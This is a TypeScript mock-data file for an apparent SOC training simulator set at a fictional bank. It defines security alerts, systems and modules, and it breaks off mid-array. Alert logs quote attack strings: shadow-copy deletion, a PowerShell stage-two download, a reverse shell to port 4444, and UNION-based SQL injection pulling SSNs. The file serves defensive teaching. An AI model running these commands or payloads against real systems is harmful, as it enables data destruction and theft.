// src/data/enterprise.ts
import type {
  User,
  SecurityAlert,
  EnterpriseSystem,
  GfsModule,
  Department,
  TeamMember,
  ActivityEvent,
  OnboardingStep,
  LogEntry,
  TimelineEvent,
  InternalMessage,
  Ticket,
  ChangeRequest,
} from '@/types';

export const MOCK_USER: User = {
  id: 'usr-001',
  employeeId: 'GFS-IN-10452',
  name: 'Security Intern',
  email: 'intern4721@gfs.com',
  role: 'Security Intern',
  rank: 'security-intern',
  department: 'SOC',
  team: 'Cyber Defense Internship',
  manager: 'Suresh Reddy',
  avatarInitials: 'SI',
  startDate: new Date().toISOString().split('T')[0],
  location: 'Hyderabad SOC',
  clearanceLevel: 2,
};

export const TEAM_MEMBERS: TeamMember[] = [
  { id: 'tm-01', name: 'Suresh Reddy', role: 'Senior SOC Manager', rank: 'security-architect', department: 'SOC', avatarInitials: 'SR', status: 'online', currentTask: 'Managing SOC response to coordinated attack' },
  { id: 'tm-02', name: 'Arjun Sharma', role: 'SOC Team Lead — Tier 2/3', rank: 'threat-hunter', department: 'SOC', avatarInitials: 'AS', status: 'online', currentTask: 'Hunting for lateral movement in Loans dept' },
  { id: 'tm-03', name: 'Raghav Sharma', role: 'SOC Analyst — Tier 1', rank: 'soc-analyst', department: 'SOC', avatarInitials: 'RS', status: 'online', currentTask: 'Triaging incoming alerts' },
  { id: 'tm-04', name: 'Sai Krishna', role: 'Incident Response Lead', rank: 'incident-responder', department: 'IR', avatarInitials: 'SK', status: 'away', currentTask: 'Coordinating ransomware containment' },
  { id: 'tm-05', name: 'Harsha Vardhan', role: 'Threat Hunting Lead', rank: 'threat-hunter', department: 'TI', avatarInitials: 'HV', status: 'online', currentTask: 'Correlating indicators with DNS logs' },
  { id: 'tm-06', name: 'Nikhil Joshi', role: 'VAPT Lead', rank: 'vapt-consultant', department: 'Offensive', avatarInitials: 'NJ', status: 'online', currentTask: 'Quarterly penetration test — Internet Banking' },
];

function makeLogs(source: string, messages: string[]): LogEntry[] {
  return messages.map((msg, i) => ({
    timestamp: new Date(Date.now() - (messages.length - i) * 30000).toISOString(),
    source,
    level: i === messages.length - 1 ? 'WARN' : 'INFO',
    message: msg,
    raw: `[${new Date(Date.now() - (messages.length - i) * 30000).toISOString()}] [${source}] [${i === messages.length - 1 ? 'WARN' : 'INFO'}] ${msg}`,
  }));
}

function makeTimeline(events: string[]): TimelineEvent[] {
  return events.map((event) => ({
    timestamp: new Date(Date.now() - Math.random() * 3600000).toISOString(),
    event: event.split('|')[0].trim(),
    actor: event.split('|')[1]?.trim() || 'System',
    detail: event.split('|')[2]?.trim() || '',
  })).sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
}

export const MOCK_ALERTS: SecurityAlert[] = [
  {
    id: 'ALT-2024-8841',
    timestamp: new Date(Date.now() - 180000).toISOString(),
    severity: 'critical',
    type: 'Potential Data Exfiltration',
    source: 'Microsoft Sentinel',
    sourceIp: '10.0.45.117',
    description: 'Large outbound data transfer detected from application server FS-APP-PROD-03 to external IP 185.220.101.42. The transfer volume of 2.4 GB exceeds the 30-day baseline by 3,400%. The destination IP is flagged in the GFS threat intelligence feed as a known C2 endpoint linked to the APT group "Silk Typhoon." The data pattern suggests customer PII and transaction records.',
    status: 'new',
    mitreId: 'T1041',
    mitreTactic: 'Exfiltration',
    mitreTechnique: 'Exfiltration Over C2 Channel',
    affectedAssets: ['FS-APP-PROD-03', 'DB-CUSTOMER-01'],
    recommendation: 'Immediately isolate FS-APP-PROD-03 from the network. Block 185.220.101.42 at the perimeter firewall. Preserve memory and disk for forensic acquisition. Escalate to Incident Response.',
    logs: makeLogs('Sentinel', [
      'Data exfiltration rule triggered: volume=2458MB dest=185.220.101.42 protocol=HTTPS',
      'TI lookup: 185.220.101.42 → SILK_TYTHON_C2 confidence=high',
      'Correlation: FS-APP-PROD-03 connected to dest 47 times in 60 minutes',
      'Anomalous process: python3 spawned by www-data with encoded arguments',
      'WARNING: Destination port changed from 443 to 8443 — potential fallback channel',
    ]),
    timeline: makeTimeline([
      'Outbound connection initiated | FS-APP-PROD-03 | TCP 443 to 185.220.101.42',
      'Data transfer volume exceeded threshold | Sentinel Analytics | 2.4GB in 28 min',
      'Threat intel match returned | TI Feed | SILK_TYTHON_C2 — HIGH confidence',
      'New alert created | SIEM | ALT-2024-8841 assigned to unassigned queue',
    ]),
  },
  {
    id: 'ALT-2024-8840',
    timestamp: new Date(Date.now() - 420000).toISOString(),
    severity: 'critical',
    type: 'Ransomware Behavior Detected',
    source: 'CrowdStrike Falcon',
    sourceIp: '10.0.22.84',
    description: 'Endpoint WRK-LOAN-047 is exhibiting mass file encryption behavior consistent with ransomware execution. Process tree shows Falcon sensor detected a Cobalt Strike beacon (beacon.exe → powershell.exe → vssadmin.exe delete shadows). File system telemetry shows .locked extension being applied to 4,200+ files in the user profile and mapped network drives.',
    status: 'investigating',
    assignee: 'Marcus Williams',
    mitreId: 'T1486',
    mitreTactic: 'Impact',
    mitreTechnique: 'Data Encrypted for Impact',
    affectedAssets: ['WRK-LOAN-047', 'DFS-LOAN-SHARE'],
    recommendation: 'Isolate WRK-LOAN-047 immediately via Falcon network containment. Take memory snapshot before shutdown. Check DFS-LOAN-SHARE for encrypted files. Identify the initial access vector. Assess blast radius across loan department file shares.',
    logs: makeLogs('Falcon', [
      'Process beacon.exe detected — IOC match: Cobalt Strike',
      'Child process powershell.exe -enc executing suspicious encoded command',
      'vssadmin.exe delete shadows /all invoked — shadow copy deletion detected',
      'Mass file write activity: 4200+ files modified in 3 minutes',
      'WARNING: .locked extension detected on DFS-LOAN-SHARE — ransomware confirmed',
    ]),
    timeline: makeTimeline([
      'Cobalt Strike beacon executed | Unknown | beacon.exe → powershell.exe',
      'Shadow copies deleted | beacon.exe | vssadmin delete shadows /all',
      'Encryption started | powershell.exe | 4,200 files modified',
      'Network share affected | DFS-LOAN-SHARE | Loan department documents',
    ]),
  },
  {
    id: 'ALT-2024-8839',
    timestamp: new Date(Date.now() - 900000).toISOString(),
    severity: 'high',
    type: 'Brute Force Attack — Impossible Travel',
    source: 'Azure AD Protection',
    sourceIp: '203.0.113.55',
    description: 'Azure AD Identity Protection detected impossible travel activity for service account svc-integration@gfs.com. 847 failed authentication attempts originated from Tor exit node 203.0.113.55 in the last 12 minutes, followed by a single successful authentication from 198.51.100.23 (Bucharest, Romania). The legitimate location for this account is New York, US.',
    status: 'investigating',
    assignee: 'David Kim',
    mitreId: 'T1110',
    mitreTactic: 'Credential Access',
    mitreTechnique: 'Brute Force',
    affectedAssets: ['Azure AD Tenant', 'svc-integration@gfs.com'],
    recommendation: 'Disable svc-integration@gfs.com immediately. Review Azure AD sign-in logs for successful authentications. Check what resources this service account accessed from the Romanian IP. Rotate all credentials associated with this account.',
    logs: makeLogs('Entra-ID', [
      'Failed login: svc-integration@gfs.com from 203.0.113.55 (Tor Exit Node)',
      'Failed login count: 847 in 12 minutes — brute force threshold exceeded',
      'SUCCESSFUL login: svc-integration@gfs.com from 198.51.100.23',
      'Impossible travel alert: NY→Bucharest in 0 minutes',
      'WARNING: Account has Contributor role on 3 Azure subscriptions',
    ]),
    timeline: makeTimeline([
      'Brute force began | 203.0.113.55 | 847 attempts over 12 minutes',
      'Authentication successful | 198.51.100.23 | Bucharest, Romania',
      'Impossible travel flagged | Azure AD Protection | Location mismatch',
      'Alert escalated | SIEM | ALT-2024-8839 assigned to Tier 1',
    ]),
  },
  {
    id: 'ALT-2024-8838',
    timestamp: new Date(Date.now() - 1500000).toISOString(),
    severity: 'high',
    type: 'Malicious PowerShell — Encoded Payload Download',
    source: 'Microsoft Defender for Endpoint',
    sourceIp: '10.0.15.203',
    description: 'Encoded PowerShell command executed on WRK-CARDS-012 by user j.patterson (Finance Dept). The command decoded to Invoke-WebRequest downloading a second-stage payload from hxxps://cdn-analytics.gfs-update[.]com/stage2.ps1. The domain gfs-update.com is a typosquat of gfs.com. The downloaded payload contains a reverse shell connecting to 45.33.32.156:4444.',
    status: 'contained',
    assignee: 'Priya Sharma',
    mitreId: 'T1059.001',
    mitreTactic: 'Execution',
    mitreTechnique: 'PowerShell',
    affectedAssets: ['WRK-CARDS-012', 'User j.patterson'],
    recommendation: 'Device has been isolated. Block gfs-update.com at DNS and proxy. Block 45.33.32.156 at firewall. Interview user j.patterson regarding initial access vector. Check if payload was executed or quarantined. Assess email delivery logs for initial phishing email.',
    logs: makeLogs('Defender', [
      'PowerShell process spawned with Base64 encoded command line',
      'Encoded command decoded: Invoke-WebRequest https://cdn-analytics.gfs-update.com/stage2.ps1',
      'Downloaded file stage2.ps1 — threat score: 92/100',
      'Network connection to 45.33.32.156:4444 blocked by EDR',
      'Device isolation initiated — all network traffic blocked except management',
    ]),
    timeline: makeTimeline([
      'PowerShell executed | j.patterson | Encoded command from scheduled task',
      'Payload downloaded | stage2.ps1 | From gfs-update.com (typosquat)',
      'Reverse shell attempted | 45.33.32.156:4444 | Blocked by EDR',
      'Device isolated | Priya Sharma | Network containment via Falcon',
    ]),
  },
  {
    id: 'ALT-2024-8837',
    timestamp: new Date(Date.now() - 2400000).toISOString(),
    severity: 'high',
    type: 'Suspicious OAuth Application Consent',
    source: 'Microsoft Entra ID',
    sourceIp: 'N/A',
    description: 'User j.patterson@gfs.com consented to third-party OAuth application "QuickAnalytics Pro" requesting Mail.ReadWrite, Files.ReadWrite.All, and User.Read permissions. This application is not in the GFS approved application list. The consent grants the application persistent access to the user mailbox and all OneDrive files without requiring re-authentication.',
    status: 'new',
    mitreId: 'T1566.002',
    mitreTactic: 'Initial Access',
    mitreTechnique: 'Spearphishing Link',
    affectedAssets: ['Azure AD — User j.patterson', 'Exchange Online — j.patterson mailbox'],
    recommendation: 'Revoke the OAuth application consent immediately. Check if the application has already accessed data. Review j.patterson sign-in logs. Block QuickAnalytics Pro in Enterprise Applications. Consider if j.patterson account is compromised based on correlation with ALT-2024-8838.',
    logs: makeLogs('Entra-ID', [
      'User j.patterson@gfs.com granted admin consent to QuickAnalytics Pro',
      'Permissions granted: Mail.ReadWrite, Files.ReadWrite.All, User.Read',
      'Application not in GFS approved app catalog',
      'Note: Same user involved in ALT-2024-8838 — potential account compromise',
    ]),
    timeline: makeTimeline([
      'OAuth consent granted | j.patterson | QuickAnalytics Pro — 3 permissions',
      'App registered in tenant | Azure AD | Non-approved application',
      'Alert created | Entra ID Protection | Consistent with consent phishing',
    ]),
  },
  {
    id: 'ALT-2024-8836',
    timestamp: new Date(Date.now() - 3600000).toISOString(),
    severity: 'medium',
    type: 'DNS Tunneling Suspected',
    source: 'Palo Alto Firewall',
    sourceIp: '10.0.30.145',
    description: 'High-entropy DNS queries detected to subdomain of ddns-provider.net from WRK-CORP-089. Query pattern shows 12,847 TXT record lookups in 1 hour with encoded data payloads averaging 220 bytes per response. Pattern is consistent with DNSBeacon C2 channel commonly used by APT groups.',
    status: 'investigating',
    assignee: "James O'Brien",
    mitreId: 'T1071.004',
    mitreTactic: 'Command and Control',
    mitreTechnique: 'Application Layer Protocol: DNS',
    affectedAssets: ['FW-EDGE-01', 'WRK-CORP-089'],
    recommendation: 'Capture full PCAP from firewall for WRK-CORP-089 traffic. Block ddns-provider.net at DNS sinkhole. Isolate endpoint for forensic analysis. Analyze decoded DNS queries for extracted data. Correlate with endpoint telemetry.',
    logs: makeLogs('Palo-Alto', [
      'DNS query: [base32-encoded].ddns-provider.net TXT — entropy=4.7 (threshold=3.5)',
      'Volume: 12,847 DNS queries in 3600s — avg 3.6/sec',
      'Destination: ddns-provider.net — not in blocklist, registered 14 days ago',
      'WARNING: TXT record responses averaging 220 bytes — data exfil suspected',
    ]),
    timeline: makeTimeline([
      'DNS queries began | WRK-CORP-089 | High-entropy TXT lookups to ddns-provider.net',
      'Volume threshold exceeded | Firewall | 12,847 queries in 1 hour',
      'Alert escalated | SIEM | ALT-2024-8836 — DNS tunneling pattern',
    ]),
  },
  {
    id: 'ALT-2024-8835',
    timestamp: new Date(Date.now() - 5400000).toISOString(),
    severity: 'medium',
    type: 'SQL Injection Pattern Detected',
    source: 'Custom SIEM Rule',
    sourceIp: '10.0.50.22',
    description: 'Application server APP-LOAN-02 is executing database queries with UNION-based injection patterns against DB-LOAN-01. The WAF blocked 23 requests in the last hour. However, 3 requests bypassed the WAF and reached the database server. Analysis of query logs reveals attempts to extract data from the customers table.',
    status: 'investigating',
    assignee: 'Li Wei',
    mitreId: 'T1190',
    mitreTactic: 'Initial Access',
    mitreTechnique: 'Exploit Public-Facing Application',
    affectedAssets: ['APP-LOAN-02', 'DB-LOAN-01'],
    recommendation: 'Review WAF bypass techniques being used. Verify database query logs for successful data extraction. Check if the application input validation can be patched. Deploy virtual patching rule. Assess if customer data was accessed.',
    logs: makeLogs('WAF', [
      'SQL injection detected: UNION SELECT NULL,NULL,NULL FROM customers',
      'Request blocked: 23/26 injection attempts stopped by WAF',
      'BYPASS detected: 3 requests reached DB-LOAN-01 with injection payloads',
      'Database query log: SELECT * FROM loans WHERE id=1 UNION SELECT name,ssn,acct FROM customers',
    ]),
    timeline: makeTimeline([
      'WAF began blocking SQLi attempts | APP-LOAN-02 | 23 blocked requests',
      'WAF bypass detected | APP-LOAN-02 | 3 requests reached database',
      'Data extraction attempt | DB-LOAN-01 | UNION query targeting customers table',
    ]),
  },
  {
    id: 'ALT-2024-8834',
    timestamp: new Date(Date.now() - 7200000).toISOString(),
    severity: 'medium',
    type: 'Certificate Transparency — Phishing Domain Detected',
    source: 'Certificate Transparency Monitor',
    sourceIp: 'N/A',
    description: 'New SSL certificate issued for gfs-secure-login.com by Let\'s Encrypt. This domain closely resembles gfs.com and is likely typosquatting phishing infrastructure. WHOIS shows registration from a known bulletproof hosting provider. The certificate was issued 47 minutes ago.',
    status: 'new',
    mitreId: 'T1583.006',
    mitreTactic: 'Resource Development',
    mitreTechnique: 'Web Services',
    affectedAssets: ['Brand Protection', 'gfs.com domain reputation'],
    recommendation: 'Add gfs-secure-login.com to DNS sinkhole. Submit takedown request to hosting provider. Check if any GFS users have received emails linking to this domain. Monitor for credential submissions to the phishing page. Alert the fraud team.',
    logs: makeLogs('CT-Monitor', [
      'New certificate: *.gfs-secure-login.com — issuer: Let\'s Encrypt',
      'WHOIS: registrant from bulletproof hosting (AS48693)',
      'Certificate issued: 47 minutes ago — suspicious timing',
      'Similarity score to gfs.com: 94% — high typosquat risk',
    ]),
    timeline: makeTimeline([
      'Certificate issued | Let\'s Encrypt | gfs-secure-login.com',
      'CT Monitor flagged | GFS Security | Domain similarity score 94%',
    ]),
  },
  {
    id: 'ALT-2024-8833',
    timestamp: new Date(Date.now() - 10800000).toISOString(),
    severity: 'low',
    type: 'Unauthorized USB Device Connected',
    source: 'Device Control Policy',
    sourceIp: '10.0.18.55',
    description: 'Unknown USB mass storage device (Kingston DataTraveler, S/N: 4C530008910211114058) connected to WRK-TREASURY-023 owned by user m.reynolds (Treasury). Device was blocked by DLP policy. No data transfer occurred. User notified via pop-up.',
    status: 'resolved',
    assignee: 'David Kim',
    mitreId: 'T1091',
    mitreTactic: 'Lateral Movement',
    mitreTechnique: 'Transfer Over Physical Medium',
    affectedAssets: ['WRK-TREASURY-023'],
    recommendation: 'No further action required — DLP policy blocked device. Log the incident for compliance. Remind user m.reynolds of USB device policy. Consider if Treasury department needs additional DLP training.',
    logs: makeLogs('DLP', [
      'USB device connected: Kingston DataTraveler S/N:4C530008910211114058',
      'Device classification: UNKNOWN — not in approved device list',
      'Action: BLOCKED by Device Control Policy — no data transfer',
      'User notification displayed on WRK-TREASURY-023',
    ]),
    timeline: makeTimeline([
      'USB connected | WRK-TREASURY-023 | Kingston DataTraveler — unknown device',
      'Device blocked | DLP Policy | No data transfer occurred',
    ]),
  },
  {
    id: 'ALT-2024-8832',
    timestamp: new Date(Date.now() - 14400000).toISOString(),
    severity: 'info',
    type: 'Scheduled Vulnerability Scan Completed',
    source: 'Qualys VMDR',
    sourceIp: 'N/A',
    description: 'Scheduled vulnerability scan completed for subnet 10.0.40.0/24 (Application Servers). Scan covered 156 assets. Findings: 2 critical, 7 high, 14 medium, 23 low. New findings compared to last scan: +3 high, +5 medium. Report ID: QR-2024-8891.',
    status: 'resolved',
    affectedAssets: ['Subnet 10.0.40.0/24 — 156 assets'],
    recommendation: 'Review critical findings for immediate patching. The 2 critical CVEs (CVE-2024-38077 and CVE-2024-30088) affect Windows RDP and should be patched within 24 hours per GFS policy. Schedule patching window with Change Management.',
    logs: makeLogs('Qualys', [
      'Scan completed: 156 assets scanned in subnet 10.0.40.0/24',
      'Findings: 2 critical, 7 high, 14 medium, 23 low',
      'Critical: CVE-2024-38077 (RDP RCE) — 8 assets affected',
      'Critical: CVE-2024-30088 (EoP) — 12 assets affected',
    ]),
    timeline: makeTimeline([
      'Scan initiated | Qualys | Scheduled — subnet 10.0.40.0/24',
      'Scan completed | Qualys | 156 assets — 46 findings total',
    ]),
  },
];

export const ENTERPRISE_SYSTEMS: EnterpriseSystem[] = [
  {
    id: 'sys-001', name: 'Active Directory', type: 'Domain Controller — gfs.local', category: 'identity',
    status: 'online', ip: '10.0.0.10', location: 'NYC-DC-01 (Primary)', owner: 'Identity Management — Tom Reeves',
    description: 'Primary AD domain controller for gfs.local forest. Manages 40,247 user accounts, 15,831 computer objects, 2,100+ group policies. Replicates to 4 additional DCs across London, Singapore, Frankfurt, and Tokyo.',
    dependencies: ['DNS (DC01)', 'Azure AD Connect', 'PKI — Root CA', 'SYSVOL Replication'],
    threats: ['Kerberoasting', 'DCSync Attack', 'Golden Ticket', 'Skeleton Key', 'PrintNightmare'],
    lastScan: '2 hours ago', uptime: '99.997%', criticality: 'critical',
    ports: [53, 88, 135, 139, 389, 445, 636, 3268, 3269],
    services: ['Kerberos', 'LDAP', 'DNS', 'SMB', 'RPC'],
    lastPatch: '2024-12-15', osVersion: 'Windows Server 2022 Datacenter',
  },
  {
    id: 'sys-002', name: 'Microsoft Sentinel', type: 'Cloud SIEM — Log Analytics', category: 'security',
    status: 'online', ip: 'sentinel.azure.com', location: 'Azure East US — Workspace gfs-sentinel-prod', owner: 'SOC — Sarah Chen',
    description: 'Primary cloud-native SIEM ingesting 2.4 TB of log data daily from 12,847 data sources. 380+ analytic rules, 45 workbooks, 28 automation rules. Average detection-to-alert time: 2.3 minutes. Data retention: 2 years hot, 7 years cold.',
    dependencies: ['Azure AD', 'Log Analytics Workspace', 'Logic Apps', 'Microsoft Defender XDR', 'Palo Alto CEF'],
    threats: ['Log manipulation / deletion', 'Connector disruption', 'Alert rule tampering', 'Workspace access escalation'],
    lastScan: 'Real-time', uptime: '99.99%', criticality: 'critical',
    ports: [443],
    services: ['KQL Analytics', 'Workbooks', 'Incidents', 'Hunting', 'Automated Response'],
    lastPatch: 'Continuous', osVersion: 'SaaS',
  },
  {
    id: 'sys-003', name: 'Palo Alto PA-7080 Cluster', type: 'Next-Generation Firewall — HA Pair', category: 'network',
    status: 'online', ip: '10.0.0.1 / 10.0.0.2', location: 'NYC-DC-FW-01/02', owner: 'Network Security — Carlos Mendes',
    description: 'Perimeter HA firewall pair handling 40Gbps aggregate throughput. Enforces zone-based segmentation, SSL decryption, threat prevention, URL filtering, and DNS security for all 38,000+ endpoints. 2,847 security policy rules active.',
    dependencies: ['Panorama Mgmt', 'Threat Intelligence Feeds', 'Cortex Data Lake', 'GlobalProtect VPN Gateway'],
    threats: ['Zero-day exploits', 'SSL/TLS bypass attacks', 'DoS/DDoS', 'Policy rule manipulation', 'Firmware vulnerabilities'],
    lastScan: '5 minutes ago', uptime: '99.999%', criticality: 'critical',
    ports: [443, 3978, 8080],
    services: ['Threat Prevention', 'URL Filtering', 'DNS Security', 'SSL Decryption', 'VPN'],
    lastPatch: '2024-12-20', osVersion: 'PAN-OS 11.1.2',
  },
  {
    id: 'sys-004', name: 'CrowdStrike Falcon', type: 'EDR / XDR Platform', category: 'security',
    status: 'online', ip: 'cloud-based (us-2.crowdstrike.com)', location: 'Cloud SaaS', owner: 'Endpoint Security — Rachel Adams',
    description: 'Deployed to 38,412 endpoints (Windows, macOS, Linux). Real-time threat detection, prevention, and response. 14-day Falcon Insight telemetry. 24/7 Falcon OverWatch threat hunting included. Active response capabilities for isolation, script execution, and remote shell.',
    dependencies: ['Azure AD', 'Network connectivity', 'Falcon Console', 'Falcon Data Replicator'],
    threats: ['Sensor tampering / bypass', 'EDR evasion techniques', 'Fileless malware', 'Bring Your Own Vulnerable Driver (BYOVD)'],
    lastScan: 'Real-time', uptime: '99.98%', criticality: 'critical',
    ports: [443],
    services: ['Falcon Insight EDR', 'Falcon Discover', 'Falcon OverWatch', 'Falcon Spotlight', 'Falcon Device Control'],
    lastPatch: 'Continuous', osVersion: 'SaaS',
  },
  {
    id: 'sys-005', name: 'Microsoft Entra ID (Azure AD)', type: 'Identity Provider — Hybrid', category: 'identity',
    status: 'online', ip: 'login.microsoftonline.com', location: 'Azure Global — Tenant gfs.com', owner: 'Identity Management — Tom Reeves',
    description: 'Primary identity provider managing 40,247 user accounts. Hybrid join with on-prem AD via Azure AD Connect. Conditional Access with 48 policies. MFA enforced for all users. PIM for privileged roles. Continuous Access Evaluation enabled.',
    dependencies: ['On-prem AD', 'Azure AD Connect', 'MFA Provider', 'Certificate Authority', 'PIM'],
    threats: ['Token theft / replay', 'MFA fatigue attacks', 'Consent phishing', 'Password spray', 'Identity federation attacks'],
    lastScan: 'Real-time', uptime: '99.99%', criticality: 'critical',
    ports: [443],
    services: ['SSO', 'Conditional Access', 'MFA', 'PIM', 'Identity Protection', 'CAE'],
    lastPatch: 'Continuous', osVersion: 'SaaS',
  },
  {
    id: 'sys-006', name: 'AWS Production (us-east-1)', type: 'Cloud Platform — Primary Workload', category: 'cloud',
    status: 'online', ip: 'AWS us-east-1 / us-west-2 / eu-west-1', location: '3 AWS Regions', owner: 'Cloud Engineering — Elena Volkov',
    description: 'Primary cloud environment hosting customer-facing Digital Banking applications. 342 EC2 instances, 85 RDS databases, 247 S3 buckets, 45 Lambda functions. GuardDuty, Security Hub, and Config enabled across all accounts. 12 AWS Organizations member accounts.',
    dependencies: ['VPC (multi-AZ)', 'IAM', 'CloudTrail', 'GuardDuty', 'Security Hub', 'WAF'],
    threats: ['S3 bucket misconfiguration', 'IAM privilege escalation', 'Lambda injection', 'EC2 instance metadata abuse', 'Supply chain attacks via dependencies'],
    lastScan: '30 minutes ago', uptime: '99.95%', criticality: 'critical',
    ports: [443, 22],
    services: ['EC2', 'RDS', 'S3', 'Lambda', 'EKS', 'GuardDuty', 'Security Hub', 'WAF'],
    lastPatch: 'Varies by service', osVersion: 'Amazon Linux 2 / Ubuntu 22.04',
  },
  {
    id: 'sys-007', name: 'Splunk Enterprise', type: 'Log Management & Analytics — On-Prem', category: 'security',
    status: 'online', ip: '10.0.100.10-14', location: 'NYC-DC — 5-node cluster', owner: 'SOC — Sarah Chen',
    description: 'On-premise Splunk cluster for long-term log retention and compliance. 5 search heads, 12 indexers, 2.8 PB storage. Retains 2 years of security logs for PCI DSS, SOX, and GLBA regulatory requirements. 4,800+ saved searches and reports.',
    dependencies: ['Universal Forwarders', 'Active Directory', 'Storage Array (NetApp)', 'IDX Cluster'],
    threats: ['Storage exhaustion', 'Forwarder manipulation', 'Saved search tampering', 'Data poisoning'],
    lastScan: '15 minutes ago', uptime: '99.97%', criticality: 'high',
    ports: [8000, 8089, 9997, 8080],
    services: ['Search', 'Indexing', 'Forwarding', 'Alerting', 'Reporting', 'SOAR'],
    lastPatch: '2024-12-10', osVersion: 'Splunk 9.2.1 on CentOS 8',
  },
  {
    id: 'sys-008', name: 'Core Banking — FIS Profile', type: 'Business Application — Transaction Processing', category: 'application',
    status: 'online', ip: '10.0.60.50 (App) / 10.0.60.60-61 (DB Cluster)', location: 'NYC-DC — Tier 4', owner: 'Retail Banking IT — Angela Torres',
    description: 'FIS Profile-based core banking platform processing $2.8 billion in daily transactions. Manages 4.2 million customer accounts, real-time transaction processing, interest calculations, and regulatory reporting. Dual data center with automatic failover.',
    dependencies: ['Oracle RAC Database Cluster', 'IBM MQ Series', 'Active Directory', 'Network Fabric', 'Backup (Veeam)'],
    threats: ['Transaction manipulation', 'SQL injection via application', 'Insider threats', 'Availability attacks', 'Data extraction'],
    lastScan: '1 hour ago', uptime: '99.999%', criticality: 'critical',
    ports: [1521, 1414, 443, 8080],
    services: ['Transaction Processing', 'Account Management', 'Interest Calculation', 'Reporting', 'API Gateway'],
    lastPatch: '2024-11-30', osVersion: 'AIX 7.3 / Oracle 19c',
  },
  {
    id: 'sys-009', name: 'Exchange Online / Defender for O365', type: 'Email Security — Hybrid', category: 'application',
    status: 'online', ip: 'outlook.office365.com / protection.outlook.com', location: 'Microsoft 365 Cloud', owner: 'IT Operations — Ben Nakamura',
    description: 'Enterprise email serving 40,247 mailboxes. Exchange Online Protection (EOP) + Defender for Office 365 Plan 2. Safe Attachments sandboxing, Safe Links time-of-click protection, anti-spoofing, and DMARC enforcement. 847 mail flow rules active.',
    dependencies: ['Azure AD', 'EOP', 'Defender for O365', 'Mail Flow Connectors', 'DLP Policies'],
    threats: ['Phishing', 'Business Email Compromise (BEC)', 'Malicious macros', 'Data exfiltration via email', 'QR code phishing'],
    lastScan: 'Real-time', uptime: '99.99%', criticality: 'high',
    ports: [443, 587, 993],
    services: ['Email Delivery', 'Anti-spam', 'Safe Attachments', 'Safe Links', 'DLP', 'Retention'],
    lastPatch: 'Continuous', osVersion: 'SaaS',
  },
  {
    id: 'sys-010', name: 'Qualys VMDR', type: 'Vulnerability Management — Cloud SaaS', category: 'security',
    status: 'online', ip: 'cloud-based (qualysguard.qualys.com)', location: 'Cloud SaaS', owner: 'Vulnerability Management — Raj Krishnan',
    description: 'Scans 45,832 assets weekly across all networks, cloud, and containers. Tracks 127,000+ vulnerabilities with VPR (Vulnerability Priority Rating) risk-based prioritization. 98.7% scan coverage. SLA tracking: Critical=24h, High=7d, Medium=30d, Low=90d.',
    dependencies: ['Scanner appliances (8x)', 'Azure AD', 'CMDB (ServiceNow)', 'Qualys Cloud Agent'],
    threats: ['Scan gaps / shadow IT', 'VPR manipulation', 'Scanner appliance compromise'],
    lastScan: '4 hours ago', uptime: '99.95%', criticality: 'high',
    ports: [443],
    services: ['VM', 'Policy Compliance', 'PCD', 'CSAM', 'Cloud Security', 'Container Security'],
    lastPatch: 'Continuous', osVersion: 'SaaS',
  },
  {
    id: 'sys-011', name: 'Kubernetes — AKS Production', type: 'Container Orchestration Platform', category: 'cloud',
    status: 'degraded', ip: '10.0.200.0/16', location: 'Azure AKS — East US 2', owner: 'Platform Engineering — Wei Zhang',
    description: 'Production Kubernetes cluster running 452 microservices across 3 node pools. Currently experiencing node pool scaling issues affecting 12 pods in the payments service. Istio service mesh. HashiCorp Vault for secrets. ArgoCD for GitOps deployments.',
    dependencies: ['Azure AKS', 'Azure Container Registry', 'Istio Service Mesh', 'HashiCorp Vault', 'ArgoCD', 'Prometheus/Grafana'],
    threats: ['Container escape', 'Kubernetes API exploitation', 'Supply chain attacks via images', 'Secrets exposure', 'RBAC misconfiguration'],
    lastScan: '10 minutes ago', uptime: '99.91%', criticality: 'high',
    ports: [443, 6443, 15017, 8200],
    services: ['Pod Scheduling', 'Service Mesh', 'Ingress', 'Secrets Management', 'GitOps', 'Monitoring'],
    lastPatch: '2024-12-18', osVersion: 'AKS 1.28.5 / Container-optimized',
  },
  {
    id: 'sys-012', name: 'ServiceNow ITSM', type: 'IT Service Management — Cloud SaaS', category: 'application',
    status: 'online', ip: 'gfs.service-now.com', location: 'Cloud SaaS', owner: 'IT Operations — Ben Nakamura',
    description: 'IT service management platform handling incident, change, problem, and request management. Integrates with Security Incident Response (SIR) module. 847 active change requests. 98.2% SLA compliance. Automates L1 ticket routing with ML classification.',
    dependencies: ['Azure AD SSO', 'SCCM Integration', 'CMDB', 'Email Integration', 'Slack Integration'],
    threats: ['Privilege escalation', 'Data exposure in tickets', 'CMDB manipulation', 'Workflow automation abuse'],
    lastScan: '1 hour ago', uptime: '99.98%', criticality: 'medium',
    ports: [443],
    services: ['Incident Mgmt', 'Change Mgmt', 'Problem Mgmt', 'CMDB', 'SIR', 'HR Service Delivery'],
    lastPatch: 'Continuous', osVersion: 'Yokohama Release',
  },
];

export const GFS_MODULES: GfsModule[] = [
  {
    id: 'mod-01', number: 1, title: 'Enterprise Orientation', category: 'Foundation', description: 'Understand GFS as an organization: business units, revenue streams, organizational structure, and how cybersecurity enables the business.',
    estimatedHours: 4, difficulty: 'beginner', prerequisites: [], objectives: ['Map GFS organizational structure', 'Identify business-critical processes', 'Understand regulatory environment', 'Recognize security\'s role in the enterprise'],
    unlocked: true, completed: false, progress: 0,
    assignment: { briefing: 'Welcome to GFS. As part of your first-day orientation, your manager Sarah Chen has requested you complete a comprehensive review of our organizational structure and business operations.', context: 'Every decision you make in security must be grounded in business understanding. Before you protect the enterprise, you must understand it.', priority: 'high', requestedBy: 'Sarah Chen — SOC Manager', deadline: 'End of Week 1' },
    systemsInvolved: ['All GFS systems'], mitreMapping: [],
  },
  {
    id: 'mod-02', number: 2, title: 'Business Fundamentals', category: 'Foundation', description: 'Financial services business processes — payment flows, settlement cycles, loan origination, insurance underwriting, and how each process maps to IT systems.',
    estimatedHours: 6, difficulty: 'beginner', prerequisites: ['mod-01'], objectives: ['Trace a payment from swipe to settlement', 'Map business processes to IT systems', 'Identify regulatory requirements (PCI DSS, SOX, GLBA)', 'Assess business impact of system outages'],
    unlocked: false, completed: false, progress: 0,
